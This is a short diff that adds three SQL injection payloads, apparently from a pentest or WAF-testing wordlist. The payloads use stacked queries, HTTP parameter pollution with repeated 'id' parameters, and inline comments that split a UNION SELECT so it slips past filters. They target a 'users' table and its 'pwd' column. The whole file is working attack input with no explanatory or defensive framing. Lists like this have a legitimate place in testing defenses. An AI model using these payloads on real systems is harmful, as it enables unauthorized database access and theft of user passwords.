@@ -1,0 +1,5 @@
+/?id=1;select+1,2,3+from+users+where+id=1—
+ 
+/?id=1;select+1&amp;id=2,3+from+users+where+id=1—
+ 
+/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users
